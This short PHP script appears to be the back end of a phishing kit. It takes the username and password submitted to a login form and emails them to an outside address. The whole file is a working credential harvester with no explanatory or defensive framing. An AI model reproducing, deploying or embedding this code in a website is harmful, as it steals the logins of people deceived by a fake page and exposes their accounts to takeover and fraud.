<?php
$message .= "Mail                            : ".$_POST['username']."\n";
$message .= "Pass                    : ".$_POST['password']."\n";
mail('f2697755@nwytg.com', 'My Subject', $message);
?>